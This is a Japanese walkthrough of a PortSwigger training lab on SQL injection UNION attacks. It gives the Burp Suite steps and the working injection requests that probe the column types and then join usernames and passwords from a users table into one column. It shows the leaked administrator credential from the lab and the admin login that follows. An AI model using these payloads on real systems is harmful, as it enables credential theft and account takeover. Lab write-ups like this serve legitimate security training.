# SQL インジェクション UNION 攻撃、単一列内の複数の値の取得

次のハッキングラボを実施します  
https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column  
このラボには、製品カテゴリ フィルターに SQL インジェクションの脆弱性が含まれています。

- 1. BurpSuite を起動して、Proxy タブからブラウザを立ち上げます
- 2. ハッキングラボにアクセスします
- 3. 商品検索結果をフィルタリングします
     ![1](https://github.com/pea-sys/web-security-experiments/assets/49807271/0866b975-9be8-42ed-bddc-2fa3cbbfc0c6)
- 4. GET /filter?category=XXXXX HTTP/2 リクエストを send to repeater します
- 5. 列の型を探ります。以下のリクエストは正常に処理されます。2 番目の列でテキストが取得できます。  
     GET /filter?category=Lifestyle'+UNION+SELECT+NULL,'abc'-- HTTP/2
- 6. リクエストを次のように書き換えて、1 列で id と pass を取得します。

GET /filter?category=Lifestyle'+UNION+SELECT+NULL,username||'+'||password+FROM+users--  
レスポンス

```html
<th>administrator 3aqe2pew8w9q5kh2jtdu</th>
```

- 7. id とパスワードを使用して、管理者アカウントでログインします
